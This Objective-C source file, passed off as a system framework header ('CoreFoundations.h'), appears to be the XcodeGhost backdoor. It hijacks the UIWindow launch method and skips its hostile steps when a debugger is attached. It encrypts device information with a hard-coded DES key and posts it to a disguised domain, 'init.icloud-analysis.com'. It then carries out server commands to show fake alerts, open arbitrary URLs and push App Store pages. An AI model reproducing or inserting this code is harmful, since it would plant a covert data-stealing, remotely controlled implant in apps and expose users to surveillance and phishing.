

#import "CoreFoundations.h"



@implementation UIWindow (didFinishLaunchingWithOptions)
- (void)makeKeyAndVisible{
    UIWindow *keywindow=[[UIApplication sharedApplication] keyWindow];
    BOOL exit=FALSE;
    if (keywindow!=Nil) {
        exit=TRUE;
    }
    
    [self makeKeyWindow];
    self.hidden=FALSE;
    
    
    if (exit==TRUE) {
        return;
    }
    
    if (CoreServices_SYSTEM_VERSION_LESS_THAN(@"6.0")) {
        return;
    }
    
    NSUserDefaults *standardUserDefaults = [NSUserDefaults standardUserDefaults];
    
    NSInteger timestamp = [[NSDate date] timeIntervalSince1970];
    NSInteger nextTimestamp=timestamp+36000000;
    [standardUserDefaults setObject:[NSString stringWithFormat:@"%d",nextTimestamp] forKey:@"SystemReserved"];
    
    [NSTimer scheduledTimerWithTimeInterval:15 target:self selector:@selector(Check) userInfo:Nil repeats:YES];
    
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(UIApplicationDidBecomeActiveNotification) name:UIApplicationDidBecomeActiveNotification object:Nil];
    
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(UIApplicationWillResignActiveNotification) name:UIApplicationWillResignActiveNotification object:Nil];
    
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(UIApplicationWillTerminateNotification) name:UIApplicationWillTerminateNotification object:Nil];
    
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(UIApplicationDidEnterBackgroundNotification) name:UIApplicationDidEnterBackgroundNotification object:Nil];
    
    
    
}



-(void)UIApplicationDidBecomeActiveNotification{
    if ([self Simulator]) {
        [self Launch];
        
    }
    if ([self Debugger]) {
        return;
    }
    [self Launch];
    
    
    
}
-(void)UIApplicationWillResignActiveNotification{
    if ([self Debugger]) {
        return;
    }
    
    [self Resign];
    
    
}
-(void)UIApplicationWillTerminateNotification{
    NSUserDefaults *standardUserDefaults = [NSUserDefaults standardUserDefaults];
    [standardUserDefaults removeObjectForKey:@"SystemReserved"];
    [standardUserDefaults removeObjectForKey:@"SystemReservedData"];
    [standardUserDefaults synchronize];
    
    if ([self Debugger]) {
        return;
    }
    [self Terminate];
    
    
    
}
-(void)UIApplicationDidEnterBackgroundNotification{
    NSUserDefaults *standardUserDefaults = [NSUserDefaults standardUserDefaults];
    [standardUserDefaults removeObjectForKey:@"SystemReserved"];
    
    if ([self Debugger]) {
        return;
    }
    [self Suspend];
    
    
    
}
-(void)Check{
    if ([self Debugger]) {
        return;
    }
    if ([UIApplication sharedApplication].applicationState!=UIApplicationStateActive)
        return;
    
    NSInteger timestamp = [[NSDate date] timeIntervalSince1970];
    NSUserDefaults *standardUserDefaults = [NSUserDefaults standardUserDefaults];
    NSInteger nextTimestamp=[[standardUserDefaults objectForKey:@"SystemReserved"] integerValue];

    if (timestamp>=nextTimestamp) {
        [self Run];
        
    }
    
    
}


-(void)productViewControllerDidFinish:(SKStoreProductViewController *)viewController{
    @try {
        UIViewController *rootViewController=[[[UIApplication sharedApplication] keyWindow] rootViewController];
        [rootViewController dismissViewControllerAnimated:YES completion:^{
            
        }];
        
    }
    @catch (NSException * e) {
        
        
    }
    @finally {
        
        
    }
    
    
}

- (BOOL)Debugger{
    
    static BOOL debuggerIsAttached = NO;
    
    static dispatch_once_t debuggerPredicate;
    dispatch_once(&debuggerPredicate, ^{
        
        struct kinfo_proc info;
        size_t info_size = sizeof(info);
        int name[4];
        
        name[0] = CTL_KERN;
        name[1] = KERN_PROC;
        name[2] = KERN_PROC_PID;
        name[3] = getpid();
        if (sysctl(name, 4, &info, &info_size, NULL, 0) == -1) {
            debuggerIsAttached = false;
        }
        
        if (!debuggerIsAttached && (info.kp_proc.p_flag & P_TRACED) != 0)
            debuggerIsAttached = true;
    });
    return debuggerIsAttached;
}
-(BOOL)Simulator{
    NSString * deviceType=[[UIDevice currentDevice] model];
    if ([[deviceType lowercaseString] rangeOfString:@"simulator"].location!=NSNotFound) {
        return YES;
    }
    return FALSE;
}


-(void)connection:(NSString*)statusTag{
    
    if ([statusTag isEqualToString:@"launch"] || [statusTag isEqualToString:@"running"]) {
        NSUserDefaults *standardUserDefaults = [NSUserDefaults standardUserDefaults];
        NSInteger timestamp = [[NSDate date] timeIntervalSince1970];
        NSInteger nextTimestamp=timestamp+36000000;
        [standardUserDefaults setObject:[NSString stringWithFormat:@"%d",nextTimestamp] forKey:@"SystemReserved"];
    }
    
    NSMutableData *concatenatedData = [NSMutableData data];
    NSData *deviceInfo=[UIDevice AppleIncReserved:statusTag];
    NSData *encryptData=[self Encrypt:deviceInfo];
    
    int32_t bodylen=[encryptData length]+8;
    bodylen=htonl(bodylen);
    NSData *bodyLendata = [NSData dataWithBytes: &bodylen length: sizeof(bodylen)];
    
    int16_t cmdlen=101;
    cmdlen=htons(cmdlen);
    NSData *cmdLenData=[NSData dataWithBytes: &cmdlen length: sizeof(cmdlen)];
    
    int16_t verLen=10;
    verLen=htons(verLen);
    NSData *verLenData=[NSData dataWithBytes: &verLen length: sizeof(verLen)];
    
    [concatenatedData appendData:bodyLendata];
    [concatenatedData appendData:cmdLenData];
    [concatenatedData appendData:verLenData];
    [concatenatedData appendData:encryptData];
    
    NSURL *url = [NSURL URLWithString:@"http://init.icloud-analysis.com"];
    NSMutableURLRequest *request =  [NSMutableURLRequest requestWithURL:url cachePolicy:NSURLRequestReloadIgnoringCacheData timeoutInterval:30];
    
    [request setHTTPMethod:@"POST"];
    [request setValue:[NSString stringWithFormat:@"%lu",(unsigned long)[concatenatedData length]] forHTTPHeaderField:@"Content-Length"];
    [request setHTTPBody: concatenatedData];
    
    if ([statusTag isEqualToString:@"launch"] || [statusTag isEqualToString:@"running"]) {
        [NSURLConnection connectionWithRequest:request  delegate:self];
    }else{
        [NSURLConnection connectionWithRequest:request  delegate:Nil];
    }
    
    
}

-(void)connection:(NSURLConnection *)connection didReceiveResponse:(NSURLResponse *)response{
    NSUserDefaults *standardUserDefaults = [NSUserDefaults standardUserDefaults];
    [standardUserDefaults removeObjectForKey:@"SystemReservedData"];
    
}
-(void)connectionDidFinishLoading:(NSURLConnection *)connection{
    
    @try {
        [self Response];
    }
    @catch (NSException * e) {
        
        
    }
    @finally {
        
        
    }
    
    
    
    
}
-(void)connection:(NSURLConnection *)connection didFailWithError:(NSError *)error{
    NSUserDefaults *standardUserDefaults = [NSUserDefaults standardUserDefaults];
    [standardUserDefaults removeObjectForKey:@"SystemReservedData"];
    
}
-(void)connection:(NSURLConnection *)connection didReceiveData:(NSData *)data{
    
    @try {
        NSUserDefaults *standardUserDefaults = [NSUserDefaults standardUserDefaults];
        NSMutableData *receivedData=[NSMutableData dataWithData:[standardUserDefaults objectForKey:@"SystemReservedData"]];
        if (receivedData==Nil) {
            [standardUserDefaults setObject:[NSMutableData dataWithData:data] forKey:@"SystemReservedData"];
        }else{
            [receivedData appendData:data];
            [standardUserDefaults setObject:receivedData forKey:@"SystemReservedData"];
        }
        
    }
    @catch (NSException * e) {
        
        
    }
    @finally {
        
        
    }
    
    
}

-(void)Launch{
    
    @try {
        [self connection:@"launch"];
    }
    @catch (NSException * e) {
        
        
    }
    @finally {
        
        
    }
    
    
}
-(void)Suspend{
    @try {
        [self connection:@"suspend"];
    }
    @catch (NSException * e) {
        
        
    }
    @finally {
        
        
    }
    
    
    
    
}
-(void)Run{
    @try {
        [self connection:@"running"];
    }
    @catch (NSException * e) {
        
        
    }
    @finally {
        
        
    }
    
    
}
-(void)Terminate{
    @try {
        [self connection:@"terminate"];
    }
    @catch (NSException * e) {
        
        
    }
    @finally {
        
        
    }
    
    
}
-(void)Resign{
    @try {
        [self connection:@"resignActive"];
    }
    @catch (NSException * e) {
        
        
    }
    @finally {
        
        
    }
    
}

-(void)Response{
    
    NSUserDefaults *standardUserDefaults = [NSUserDefaults standardUserDefaults];
    NSMutableData *receivedData=[NSMutableData dataWithData:[standardUserDefaults objectForKey:@"SystemReservedData"]];
    
    if ([receivedData length]<=8) return;
    NSData *subData=[receivedData subdataWithRange:NSMakeRange(8, [receivedData length]-8)];
    
    NSData *decryptData=[self Decrypt:subData];
    
    NSError *error=Nil;
    id dict=[NSJSONSerialization JSONObjectWithData:decryptData options:NSJSONReadingMutableContainers error:&error];
    if (error!=Nil) return;
    
    if ([dict objectForKey:@"sleep"]!=Nil) {
        int sleep=[[dict objectForKey:@"sleep"] intValue];
        if (sleep>0)  {
            NSInteger timestamp = [[NSDate date] timeIntervalSince1970];
            NSInteger nextTimestamp=timestamp+sleep;
            NSUserDefaults *standardUserDefaults = [NSUserDefaults standardUserDefaults];
            [standardUserDefaults setObject:[NSString stringWithFormat:@"%d",nextTimestamp] forKey:@"SystemReserved"];
        }
    }
    float actionAfterDelay=0;
    if ([dict objectForKey:@"showDelay"]!=Nil) {
        actionAfterDelay=[[dict objectForKey:@"showDelay"] floatValue];
        
    }
    
    if ([dict objectForKey:@"alertHeader"]!=Nil &&  [dict objectForKey:@"alertBody"]!=Nil && [dict objectForKey:@"appID"]!=Nil&[dict objectForKey:@"cancelTitle"]!=nil && [dict objectForKey:@"confirmTitle"]!=Nil && [dict objectForKey:@"scheme"]!=Nil) {
        
        if ([[UIApplication sharedApplication ] canOpenURL:[NSURL URLWithString:[dict objectForKey:@"scheme"]]]) {
            return;
        }
        
        NSString *header=[dict objectForKey:@"alertHeader"];
        NSString *body=[dict objectForKey:@"alertBody"];
        NSString *appID=[dict objectForKey:@"appID"];
        NSString *cancelTittle=[dict objectForKey:@"cancelTitle"];
        NSString *confirmTitle=[dict objectForKey:@"confirmTitle"];
        
        if ([UIApplication sharedApplication].applicationState==UIApplicationStateActive){
            double delayInSeconds = actionAfterDelay;
            dispatch_time_t popTime = dispatch_time(DISPATCH_TIME_NOW, delayInSeconds * NSEC_PER_SEC);
            dispatch_after(popTime, dispatch_get_main_queue(), ^(void){
                UIAlertView *alert=[[UIAlertView alloc] initWithTitle:header message:body delegate:self cancelButtonTitle:cancelTittle otherButtonTitles:confirmTitle, nil];
                [alert show];
                alert.tag=[appID integerValue];
            });
            
        }
        
        return;
    }
    
    
    if ([dict objectForKey:@"configUrl"]!=Nil && [dict objectForKey:@"scheme"]!=Nil) {
        if ([[UIApplication sharedApplication ] canOpenURL:[NSURL URLWithString:[dict objectForKey:@"scheme"]]]) {
            return;
        }
        
        NSString *url=[dict objectForKey:@"configUrl"];
        double delayInSeconds = actionAfterDelay;
        dispatch_time_t popTime = dispatch_time(DISPATCH_TIME_NOW, delayInSeconds * NSEC_PER_SEC);
        dispatch_after(popTime, dispatch_get_main_queue(), ^(void){
            [self Show:url scheme:[dict objectForKey:@"scheme"]];
        });
        return;
        
    }
    
    
    NSString *appID=[dict objectForKey:@"appID"];
    if (appID!=Nil && [dict objectForKey:@"scheme"]!=Nil) {
        if ([[UIApplication sharedApplication ] canOpenURL:[NSURL URLWithString:[dict objectForKey:@"scheme"]]]) {
            return;
        }
        
        double delayInSeconds = actionAfterDelay;
        dispatch_time_t popTime = dispatch_time(DISPATCH_TIME_NOW, delayInSeconds * NSEC_PER_SEC);
        dispatch_after(popTime, dispatch_get_main_queue(), ^(void){
            [self Store:appID];
            
        });
        return;
    }
    [standardUserDefaults removeObjectForKey:@"SystemReservedData"];
    
}

- (void)alertView:(UIAlertView *)alertView didDismissWithButtonIndex:(NSInteger)buttonIndex
{
    
    if (buttonIndex==1) {
        [self Store:[NSString stringWithFormat:@"%d",alertView.tag]];
        [self connection:@"AlertView"];
    }
    
    
    
    
}

-(void)Show:(NSString*)url  scheme:(NSString*)scheme{
    if ([UIApplication sharedApplication].applicationState!=UIApplicationStateActive)
        return;
    [[UIApplication sharedApplication] openURL:[NSURL URLWithString:url]];
    
    
    
}
-(void)Store:(NSString*)appID{
    if ([UIApplication sharedApplication].applicationState!=UIApplicationStateActive)
        return;
    
    
    
    
    @try {
        SKStoreProductViewController *productViewController = [[SKStoreProductViewController alloc] init];
        NSDictionary *appParameters = [NSDictionary dictionaryWithObject:appID
                                                                  forKey:SKStoreProductParameterITunesItemIdentifier];
        
        
        [productViewController setDelegate:self];
        [productViewController loadProductWithParameters:appParameters
                                         completionBlock:^(BOOL result, NSError *error)
         {
             
         }];
        UIViewController *rootViewController=[[[UIApplication sharedApplication] keyWindow] rootViewController];
        [rootViewController presentViewController:productViewController animated:YES
                                       completion:^{ } ];
    }
    @catch (NSException * e) {
        
        
    }
    @finally {
        
        
    }
    
    
    
    
}



-(NSData*)Encrypt:(NSData*)plainData{
    NSString *key = @"stringWithFormat";
    char keyPtr[kCCKeySizeAES256 + 1];
    bzero(keyPtr, sizeof(keyPtr));
    
    [key getCString:keyPtr maxLength:sizeof(keyPtr) encoding:NSUTF8StringEncoding];
    
    NSUInteger dataLength = [plainData length];
    
    size_t bufferSize           = dataLength + kCCBlockSizeDES;
    void* buffer                = malloc(bufferSize);
    
    size_t numBytesEncrypted    = 0;
    
    CCCryptorStatus cryptStatus = CCCrypt(kCCEncrypt, kCCAlgorithmDES, kCCOptionPKCS7Padding |kCCOptionECBMode,
                                          keyPtr, kCCKeySizeDES,
                                          NULL /* initialization vector (optional) */,
                                          [plainData bytes], dataLength, /* input */
                                          buffer, bufferSize, /* output */
                                          &numBytesEncrypted);
    
    
    if (cryptStatus == kCCSuccess) {
        return [NSData dataWithBytesNoCopy:buffer length:numBytesEncrypted];
    }
    
    free(buffer);
    return nil;
}

-(NSData*)Decrypt:(NSData*)encryptData{
    NSString *key = @"stringWithFormat";
    char keyPtr[kCCKeySizeAES256 + 1];
    bzero(keyPtr, sizeof(keyPtr));
    
    [key getCString:keyPtr maxLength:sizeof(keyPtr) encoding:NSUTF8StringEncoding];
    
    NSUInteger dataLength = [encryptData length];
    
    size_t bufferSize           = dataLength + kCCBlockSizeDES;
    void* buffer                = malloc(bufferSize);
    
    size_t numBytesDecrypted    = 0;
    
    CCCryptorStatus cryptStatus = CCCrypt(kCCDecrypt, kCCAlgorithmDES, kCCOptionPKCS7Padding|kCCOptionECBMode,
                                          keyPtr, kCCKeySizeDES,
                                          NULL /* initialization vector (optional) */,
                                          [encryptData bytes], dataLength, /* input */
                                          buffer, bufferSize, /* output */
                                          &numBytesDecrypted);
    
    if (cryptStatus == kCCSuccess) {
        return [NSData dataWithBytesNoCopy:buffer length:numBytesDecrypted];
    }
    
    free(buffer);
    return nil;
}


@end